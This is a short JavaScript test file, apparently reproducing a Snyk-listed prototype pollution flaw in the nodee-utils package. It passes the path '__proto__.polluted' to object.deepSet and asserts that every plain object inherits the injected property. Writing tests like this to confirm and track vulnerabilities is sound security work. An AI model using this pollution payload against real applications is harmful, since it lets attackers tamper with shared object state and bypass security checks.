//https://snyk.io/vuln/SNYK-JS-NODEEUTILS-598679

test("prototype pollution in nodee-utils", () => {
  const { object } = require("nodee-utils");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  object.deepSet({}, "__proto__.polluted", "yes");
  expect({}.polluted).toBe("yes");
});
